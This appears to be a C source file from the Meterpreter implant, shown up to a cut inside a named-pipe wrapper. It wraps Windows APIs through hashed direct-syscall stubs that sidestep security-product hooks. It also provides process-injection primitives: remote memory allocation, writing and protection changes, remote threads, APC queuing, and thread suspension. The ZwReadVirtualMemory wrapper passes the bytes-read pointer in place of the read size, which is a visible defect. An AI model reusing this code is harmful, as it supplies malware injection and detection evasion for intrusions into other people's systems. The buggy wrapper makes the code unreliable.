#ifndef _METERPRETER_WINAPI_C
#define _METERPRETER_WINAPI_C
#include "winapi.h"

#include "../ReflectiveDLLInjection/dll/src/DirectSyscall.h"
#include "common.h"

#define KERNEL32_DLL "kernel32.dll"
#define NTDLL_DLL "ntdll.dll"
#define ADVAPI32_DLL "advapi32.dll"
#define CRYPT32_DLL "crypt32.dll"
#define USER32_DLL "user32.dll"
#define WS2_32_DLL "ws2_32.dll"
#define RPCRT4_DLL "rpcrt4.dll"
#define WINHTTP_DLL "winhttp.dll"
#define WININET_DLL "wininet.dll"

typedef struct NtDllFunction {
    LPCSTR lpFunctionName;
    DWORD dwNumberOfArgs;
} NtDllFunction;

NtDllFunction lpFunctionsTobeLoaded[] = {
    {.lpFunctionName = "ZwAllocateVirtualMemory", .dwNumberOfArgs = 6},
    {.lpFunctionName = "ZwOpenProcess", .dwNumberOfArgs = 4},
    {.lpFunctionName = "ZwWriteVirtualMemory", .dwNumberOfArgs = 5},
    {.lpFunctionName = "ZwReadVirtualMemory", .dwNumberOfArgs = 5},
    {.lpFunctionName = "ZwProtectVirtualMemory", .dwNumberOfArgs = 5},
    {.lpFunctionName = "ZwQueryVirtualMemory", .dwNumberOfArgs = 6},
    {.lpFunctionName = "ZwFreeVirtualMemory", .dwNumberOfArgs = 4}};

enum NtDllSyscall {
    ZwAllocateVirtualMemory,
    ZwOpenProcess,
    ZwWriteVirtualMemory,
    ZwReadVirtualMemory,
    ZwProtectVirtualMemory,
    ZwQueryVirtualMemory,
    ZwFreeVirtualMemory
};

#define STATUS_SUCCESS 0
Syscall** lpWinApiSyscalls = NULL;

extern NTSTATUS SyscallStub(Syscall* pSyscall, ...);

Syscall** GetOrInitWinApiSyscalls() {
    if (lpWinApiSyscalls == NULL) {
        BOOL bError = FALSE;
        HANDLE hHeap = GetProcessHeap();
        bError = hHeap == NULL;
        DWORD dwNumbOfSyscalls = sizeof(lpFunctionsTobeLoaded) / sizeof(NtDllFunction);
        Syscall* lpSyscall = NULL;
        if (!bError) {
            lpWinApiSyscalls = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Syscall*) * dwNumbOfSyscalls);
            dprintf("[WINAPI][GetOrInitWinApiSyscalls] lpWinApiSyscalls = %p", lpWinApiSyscalls);
            bError = lpWinApiSyscalls == NULL;
        }
        if (!bError) {
            for (DWORD i = 0; i < dwNumbOfSyscalls; i++) {
                lpSyscall = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Syscall));
                bError = lpSyscall == NULL;
                if (bError) {
                    break;
                }
                lpSyscall->dwCryptedHash = _hash((char*)lpFunctionsTobeLoaded[i].lpFunctionName);
                lpSyscall->dwNumberOfArgs = lpFunctionsTobeLoaded[i].dwNumberOfArgs;
                lpWinApiSyscalls[i] = lpSyscall;
                dprintf("[WINAPI][GetOrInitWinApiSyscalls] lpSyscall = %p; dwCryptedHash = %p", lpSyscall, lpSyscall->dwCryptedHash);
            }
        }
        if (!bError) {
            bError = !getSyscalls(GetModuleHandleA(NTDLL_DLL), lpWinApiSyscalls, dwNumbOfSyscalls);
            if (!bError) {
                for (DWORD i = 0; i < dwNumbOfSyscalls; i++) {
                    dprintf("[WINAPI][GetOrInitWinApiSyscalls] Index: %d pStub: %p, dwSyscallNr: %d", i, lpWinApiSyscalls[i]->pStub, lpWinApiSyscalls[i]->dwSyscallNr);
                }
            }
        }
        if (bError) {
            dprintf("[WINAPI][GetOrInitWinApiSyscalls] Error creating Syscall structure.");
            if (lpWinApiSyscalls != NULL) {
                for (DWORD i = 0; i < dwNumbOfSyscalls; i++) {
                    lpSyscall = lpWinApiSyscalls[i];
                    if (lpSyscall != NULL) {
                        HeapFree(hHeap, 0, lpSyscall);
                    }
                }
                HeapFree(hHeap, 0, lpWinApiSyscalls);
                lpWinApiSyscalls = NULL;
            }
        }
    }

    return lpWinApiSyscalls;
}

BOOL hasDirectSyscallSupport() {
    if (lpWinApiSyscalls == NULL) {
        if (GetOrInitWinApiSyscalls() == NULL) {
            return FALSE;
        }
    }
    return TRUE;
}

void* GetFunction(LPCSTR lpModuleName, LPCSTR lpFunctionName) {
    HMODULE hModule = NULL;
    FARPROC lpOutput = NULL;
    hModule = GetModuleHandleA(lpModuleName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(lpModuleName);
    }
    if (hModule != NULL) {
        lpOutput = GetProcAddress(hModule, lpFunctionName);
    }
    if (hModule == NULL) {
        dprintf("[WINAPI][GetFunction] Unable to find or load '%s' module.", lpModuleName);
    }
    if (lpOutput == NULL) {
        dprintf("[WINAPI][GetFunction] Unable to find '%s' function's address.", lpFunctionName);
    }
    return lpOutput;
}

// START: ntdll.dll

NTSTATUS winapi_ntdll_ZwAllocateVirtualMemory(HANDLE hProcess, PVOID* pBaseAddress, ULONG_PTR pZeroBits, PSIZE_T pRegionSize, ULONG ulAllocationType, ULONG ulProtect) {
    return SyscallStub(lpWinApiSyscalls[ZwAllocateVirtualMemory], hProcess, pBaseAddress, pZeroBits, pRegionSize, ulAllocationType, ulProtect);
}

NTSTATUS winapi_ntdll_ZwOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    return SyscallStub(lpWinApiSyscalls[ZwOpenProcess], ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS winapi_ntdll_ZwWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten) {
    return SyscallStub(lpWinApiSyscalls[ZwWriteVirtualMemory], ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS winapi_ntdll_ZwReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesRead) {
    return SyscallStub(lpWinApiSyscalls[ZwReadVirtualMemory], ProcessHandle, BaseAddress, Buffer, NumberOfBytesRead, NumberOfBytesRead);
}

NTSTATUS winapi_ntdll_ZwProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    return SyscallStub(lpWinApiSyscalls[ZwProtectVirtualMemory], ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS winapi_ntdll_ZwQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
    return SyscallStub(lpWinApiSyscalls[ZwQueryVirtualMemory], ProcessHandle, BaseAddress, MemoryInformationClass, MemoryInformation, MemoryInformationLength, ReturnLength);
}

NTSTATUS winapi_ntdll_ZwFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
    return SyscallStub(lpWinApiSyscalls[ZwFreeVirtualMemory], ProcessHandle, BaseAddress, RegionSize, FreeType);
}

NTSTATUS winapi_ntdll_NtQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcContext, PVOID Argument1, PVOID Argument2) {
    NTSTATUS (*pNtQueueApcThread)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcContext, PVOID Argument1, PVOID Argument2) = GetFunction(NTDLL_DLL, "NtQueueApcThread");
    dprintf("[WINAPI][winapi_ntdll_NtQueueApcThread] Calling NtQueueApcThread @ %p", pNtQueueApcThread);
    if (pNtQueueApcThread) {
        return pNtQueueApcThread(ThreadHandle, ApcRoutine, ApcContext, Argument1, Argument2);
    }
    return 0xC0000001;  // STATUS_UNSUCCESSFUL
}

NTSTATUS winapi_ntdll_NtOpenThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    NTSTATUS (*pNtOpenThread)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) = GetFunction(NTDLL_DLL, "NtOpenThread");
    dprintf("[WINAPI][winapi_ntdll_NtOpenThread] Calling NtOpenThread @ %p", pNtOpenThread);
    if (pNtOpenThread) {
        return pNtOpenThread(ThreadHandle, DesiredAccess, ObjectAttributes, ClientId);
    }
    return 0xC0000001; // STATUS_UNSUCCESSFUL
}

// END: ntdll.dll
// START: kernel32.dll

BOOL winapi_kernel32_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    if (hasDirectSyscallSupport()) {
        NTSTATUS dwStatus = winapi_ntdll_ZwWriteVirtualMemory(hProcess, lpBaseAddress, (LPVOID)lpBuffer, (ULONG)nSize, (PULONG)lpNumberOfBytesWritten);
        dprintf("[WINAPI][winapi_kernel32_WriteProcessMemory] Syscall ZwWriteVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (*pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) = GetFunction(KERNEL32_DLL, "WriteProcessMemory");
        dprintf("[WINAPI][winapi_kernel32_WriteProcessMemory] Calling WriteProcessMemory @ %p", pWriteProcessMemory);
        if (pWriteProcessMemory) {
            return pWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
        }
    }
    return FALSE;
}

BOOL winapi_kernel32_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) {
    if (hasDirectSyscallSupport()) {
        NTSTATUS dwStatus = winapi_ntdll_ZwReadVirtualMemory(hProcess, (LPVOID)lpBaseAddress, lpBuffer, (ULONG)nSize, (PULONG)lpNumberOfBytesRead);
        dprintf("[WINAPI][winapi_kernel32_ReadProcessMemory] Syscall ZwReadVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (*pReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) = GetFunction(KERNEL32_DLL, "ReadProcessMemory");
        dprintf("[WINAPI][winapi_kernel32_ReadProcessMemory] Calling ReadProcessMemory @ %p", pReadProcessMemory);
        if (pReadProcessMemory) {
            return pReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
        }
    }
    return FALSE;
}

HANDLE winapi_kernel32_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    if (hasDirectSyscallSupport()) {
        OBJECT_ATTRIBUTES objAttributes = {0};
        objAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
        CLIENT_ID clientId;
        HANDLE hProcess = NULL;
        clientId.UniqueThread = NULL;
        clientId.UniqueProcess = (HANDLE)((ULONG_PTR)dwProcessId);
        NTSTATUS dwStatus = winapi_ntdll_ZwOpenProcess(&hProcess, dwDesiredAccess, &objAttributes, &clientId);
        dprintf("[WINAPI][winapi_kernel32_OpenProcess] Syscall ZwOpenProcess returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return hProcess;
        }
    } else {
        HANDLE (*pOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) = GetFunction(KERNEL32_DLL, "OpenProcess");
        dprintf("[WINAPI][winapi_kernel32_OpenProcess] Calling OpenProcess @ %p", pOpenProcess);
        if (pOpenProcess) {
            return pOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
        }
    }
    return NULL;
}

LPVOID winapi_kernel32_VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwAllocateVirtualMemory(GetCurrentProcess(), &lpBaseAddr, 0, &dwDataSize, flAllocationType, flProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualAlloc] Syscall ZwAllocateVirtualMemory returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return lpBaseAddr;
        }
    } else {
        LPVOID (*pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = GetFunction(KERNEL32_DLL, "VirtualAlloc");
        dprintf("[WINAPI][winapi_kernel32_VirtualAlloc] Calling VirtualAlloc @ %p", pVirtualAlloc);
        if (pVirtualAlloc) {
            return pVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
        }
    }
    return NULL;
}

LPVOID winapi_kernel32_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwAllocateVirtualMemory(hProcess, &lpBaseAddr, 0, &dwDataSize, flAllocationType, flProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualAllocEx] Syscall ZwAllocateVirtualMemory returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return lpBaseAddr;
        }
    } else {
        LPVOID (*pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = GetFunction(KERNEL32_DLL, "VirtualAllocEx");
        dprintf("[WINAPI][winapi_kernel32_VirtualAllocEx] Calling VirtualAllocEx @ %p", pVirtualAllocEx);
        if (pVirtualAllocEx) {
            return pVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
        }
    }
    return NULL;
}

BOOL winapi_kernel32_VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwProtectVirtualMemory(GetCurrentProcess(), lpAddress, &dwDataSize, flNewProtect, lpflOldProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualProtect] Syscall ZwProtectVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (*pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) = GetFunction(KERNEL32_DLL, "VirtualProtect");
        dprintf("[WINAPI][winapi_kernel32_VirtualProtect] Calling VirtualProtect @ %p", pVirtualProtect);
        if (pVirtualProtect) {
            return pVirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
        }
    }
    return FALSE;
}

BOOL winapi_kernel32_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwProtectVirtualMemory(hProcess, lpAddress, &dwDataSize, flNewProtect, lpflOldProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualProtectEx] Syscall ZwProtectVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (*pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) = GetFunction(KERNEL32_DLL, "VirtualProtectEx");
        dprintf("[WINAPI][winapi_kernel32_VirtualProtectEx] Calling VirtualProtectEx @ %p", pVirtualProtectEx);
        if (pVirtualProtectEx) {
            return pVirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
        }
    }
    return FALSE;
}

SIZE_T winapi_kernel32_VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (hasDirectSyscallSupport()) {
        SIZE_T returnLength = 0;
        NTSTATUS dwStatus = winapi_ntdll_ZwQueryVirtualMemory(GetCurrentProcess(), (LPVOID)lpAddress, MemoryBasicInformation, lpBuffer, sizeof(MEMORY_BASIC_INFORMATION), &returnLength);
        dprintf("[WINAPI][winapi_kernel32_VirtualQuery] Syscall ZwQueryVirtualMemory returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return returnLength;
        }
    } else {
        SIZE_T (*pVirtualQuery)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) = GetFunction(KERNEL32_DLL, "VirtualQuery");
        dprintf("[WINAPI][winapi_kernel32_VirtualQuery] Calling VirtualQuery @ %p", pVirtualQuery);
        if (pVirtualQuery) {
            return pVirtualQuery(lpAddress, lpBuffer, dwLength);
        }
    }
    return 0;
}

SIZE_T winapi_kernel32_VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (hasDirectSyscallSupport()) {
        SIZE_T returnLength = 0;
        NTSTATUS dwStatus = winapi_ntdll_ZwQueryVirtualMemory(hProcess, (LPVOID)lpAddress, MemoryBasicInformation, lpBuffer, dwLength, &returnLength);
        dprintf("[WINAPI][winapi_kernel32_VirtualQueryEx] Syscall ZwQueryVirtualMemory returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return returnLength;
        }
    } else {
        SIZE_T (*pVirtualQueryEx)(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) = GetFunction(KERNEL32_DLL, "VirtualQueryEx");
        dprintf("[WINAPI][winapi_kernel32_VirtualQueryEx] Calling VirtualQueryEx @ %p", pVirtualQueryEx);
        if (pVirtualQueryEx) {
            return pVirtualQueryEx(hProcess, lpAddress, lpBuffer, dwLength);
        }
    }
    return 0;
}

BOOL winapi_kernel32_VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
    if (hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwFreeVirtualMemory(GetCurrentProcess(), lpAddress, &dwDataSize, dwFreeType);
        dprintf("[WINAPI][winapi_kernel32_VirtualFree] Syscall ZwFreeVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (*pVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) = GetFunction(KERNEL32_DLL, "VirtualFree");
        dprintf("[WINAPI][winapi_kernel32_VirtualFree] Calling VirtualFree @ %p", pVirtualFree);
        if (pVirtualFree) {
            return pVirtualFree(lpAddress, dwSize, dwFreeType);
        }
    }
    return FALSE;
}

HANDLE winapi_kernel32_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    HANDLE (*pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) = GetFunction(KERNEL32_DLL, "CreateRemoteThread");
    if (pCreateRemoteThread) {
        return pCreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    }
    return NULL;
}

BOOL winapi_kernel32_CloseHandle(HANDLE hObject) {
    BOOL (*pCloseHandle)(HANDLE hObject) = GetFunction(KERNEL32_DLL, "CloseHandle");
    dprintf("[WINAPI][winapi_kernel32_CloseHandle] Calling CloseHandle @ %p", pCloseHandle);
    if (pCloseHandle) {
        return pCloseHandle(hObject);
    }
    return FALSE;
}

BOOL winapi_kernel32_DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) {
    BOOL (*pDuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) = GetFunction(KERNEL32_DLL, "DuplicateHandle");
    dprintf("[WINAPI][winapi_kernel32_DuplicateHandle] Calling DuplicateHandle @ %p", pDuplicateHandle);
    if (pDuplicateHandle) {
        return pDuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
    }
    return FALSE;
}

HANDLE winapi_kernel32_CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) {
    HANDLE (*pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID) = GetFunction(KERNEL32_DLL, "CreateToolhelp32Snapshot");
    dprintf("[WINAPI][winapi_kernel32_CreateToolhelp32Snapshot] Calling CreateToolhelp32Snapshot @ %p", pCreateToolhelp32Snapshot);
    if (pCreateToolhelp32Snapshot) {
        return pCreateToolhelp32Snapshot(dwFlags, th32ProcessID);
    }
    return INVALID_HANDLE_VALUE;
}

BOOL winapi_kernel32_Thread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte) {
    BOOL (*pThread32First)(HANDLE hSnapshot, LPTHREADENTRY32 lpte) = GetFunction(KERNEL32_DLL, "Thread32First");
    dprintf("[WINAPI][winapi_kernel32_Thread32First] Calling Thread32First @ %p", pThread32First);
    if (pThread32First) {
        return pThread32First(hSnapshot, lpte);
    }
    return FALSE;
}

HANDLE winapi_kernel32_OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId) {
    HANDLE (*pOpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId) = GetFunction(KERNEL32_DLL, "OpenThread");
    dprintf("[WINAPI][winapi_kernel32_OpenThread] Calling OpenThread @ %p", pOpenThread);
    if (pOpenThread) {
        return pOpenThread(dwDesiredAccess, bInheritHandle, dwThreadId);
    }
    return NULL;
}

DWORD winapi_kernel32_SuspendThread(HANDLE hThread) {
    DWORD (*pSuspendThread)(HANDLE hThread) = GetFunction(KERNEL32_DLL, "SuspendThread");
    dprintf("[WINAPI][winapi_kernel32_SuspendThread] Calling SuspendThread @ %p", pSuspendThread);
    if (pSuspendThread) {
        return pSuspendThread(hThread);
    }
    return (DWORD)-1;
}

BOOL winapi_kernel32_Thread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lpte) {
    BOOL (*pThread32Next)(HANDLE hSnapshot, LPTHREADENTRY32 lpte) = GetFunction(KERNEL32_DLL, "Thread32Next");
    dprintf("[WINAPI][winapi_kernel32_Thread32Next] Calling Thread32Next @ %p", pThread32Next);
    if (pThread32Next) {
        return pThread32Next(hSnapshot, lpte);
    }
    return FALSE;
}

DWORD winapi_kernel32_ResumeThread(HANDLE hThread) {
    DWORD (*pResumeThread)(HANDLE hThread) = GetFunction(KERNEL32_DLL, "ResumeThread");
    dprintf("[WINAPI][winapi_kernel32_ResumeThread] Calling ResumeThread @ %p", pResumeThread);
    if (pResumeThread) {
        return pResumeThread(hThread);
    }
    return (DWORD)-1;
}

BOOL winapi_kernel32_FreeLibrary(HMODULE hLibModule) {
    BOOL (*pFreeLibrary)(HMODULE hLibModule) = GetFunction(KERNEL32_DLL, "FreeLibrary");
    dprintf("[WINAPI][winapi_kernel32_FreeLibrary] Calling FreeLibrary @ %p", pFreeLibrary);
    if (pFreeLibrary) {
        return pFreeLibrary(hLibModule);
    }
    return FALSE;
}

BOOL winapi_kernel32_FlushInstructionCache(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize) {
    BOOL (*pFlushInstructionCache)(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize) = GetFunction(KERNEL32_DLL, "FlushInstructionCache");
    dprintf("[WINAPI][winapi_kernel32_FlushInstructionCache] Calling FlushInstructionCache @ %p", pFlushInstructionCache);
    if (pFlushInstructionCache) {
        return pFlushInstructionCache(hProcess, lpBaseAddress, dwSize);
    }
    return FALSE;
}

HLOCAL winapi_kernel32_LocalFree(HLOCAL hMem) {
    HLOCAL (*pLocalFree)(HLOCAL hMem) = GetFunction(KERNEL32_DLL, "LocalFree");
    dprintf("[WINAPI][winapi_kernel32_LocalFree] Calling LocalFree @ %p", pLocalFree);
    if (pLocalFree) {
        return pLocalFree(hMem);
    }
    return hMem;  // Per documentation, on failure, the handle is returned.
}

HANDLE winapi_kernel32_CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    HANDLE (*pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) = GetFunction(KERNEL32_DLL, "CreateFileA");
    dprintf("[WINAPI][winapi_kernel32_CreateFileA] Calling CreateFileA @ %p", pCreateFileA);
    if (pCreateFileA) {
        return pCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    }
    return INVALID_HANDLE_VALUE;
}

BOOL winapi_kernel32_WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
    BOOL (*pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) = GetFunction(KERNEL32_DLL, "WriteFile");
    dprintf("[WINAPI][winapi_kernel32_WriteFile] Calling WriteFile @ %p", pWriteFile);
    if (pWriteFile) {
        return pWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    }
    return FALSE;
}

HMODULE winapi_kernel32_LoadLibraryA(LPCSTR lpLibFileName) {
    HMODULE (*pLoadLibraryA)(LPCSTR lpLibFileName) = GetFunction(KERNEL32_DLL, "LoadLibraryA");
    dprintf("[WINAPI][winapi_kernel32_LoadLibraryA] Calling LoadLibraryA @ %p", pLoadLibraryA);
    if (pLoadLibraryA) {
        return pLoadLibraryA(lpLibFileName);
    }
    return NULL;
}

DWORD winapi_kernel32_WaitForMultipleObjects(DWORD nCount, const HANDLE* lpHandles, BOOL bWaitAll, DWORD dwMilliseconds) {
    DWORD (*pWaitForMultipleObjects)(DWORD nCount, const HANDLE* lpHandles, BOOL bWaitAll, DWORD dwMilliseconds) = GetFunction(KERNEL32_DLL, "WaitForMultipleObjects");
    dprintf("[WINAPI][winapi_kernel32_WaitForMultipleObjects] Calling WaitForMultipleObjects @ %p", pWaitForMultipleObjects);
    if (pWaitForMultipleObjects) {
        return pWaitForMultipleObjects(nCount, lpHandles, bWaitAll, dwMilliseconds);
    }
    return WAIT_FAILED;
}

BOOL winapi_kernel32_SetHandleInformation(HANDLE hObject, DWORD dwMask, DWORD dwFlags) {
    BOOL (*pSetHandleInformation)(HANDLE hObject, DWORD dwMask, DWORD dwFlags) = GetFunction(KERNEL32_DLL, "SetHandleInformation");
    dprintf("[WINAPI][winapi_kernel32_SetHandleInformation] Calling SetHandleInformation @ %p", pSetHandleInformation);
    if (pSetHandleInformation) {
        return pSetHandleInformation(hObject, dwMask, dwFlags);
    }
    return FALSE;
}

HGLOBAL winapi_kernel32_GlobalFree(HGLOBAL hMem) {
    HGLOBAL (*pGlobalFree)(HGLOBAL hMem) = GetFunction(KERNEL32_DLL, "GlobalFree");
    dprintf("[WINAPI][winapi_kernel32_GlobalFree] Calling GlobalFree @ %p", pGlobalFree);
    if (pGlobalFree) {
        return pGlobalFree(hMem);
    }
    return hMem;  // Per documentation, on failure, the handle is returned.
}

HANDLE winapi_kernel32_CreateNamedPipeA(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes) {
    HANDLE (*pCreateNamedPipeA)(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes) = GetFunction(KERNEL32_DLL, "CreateNamedPipeA");
    dprintf("[WINAPI][winapi_kernel32_CreateNamedPipeA] Calling CreateNamedPipeA @ %p", pCreateNamedPipeA);
    if (pCreateNamedPipeA) {
        return pCreateNamedPipeA(lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeOut, lpSecurityAttributes);
    }
    return INVALID_HANDLE_VALUE;
}

BOOL winapi_kernel32_ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) {
    BOOL (*pConnectNamedPipe)(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) = GetFunction(KERNEL32_DLL, "ConnectNamedPipe");
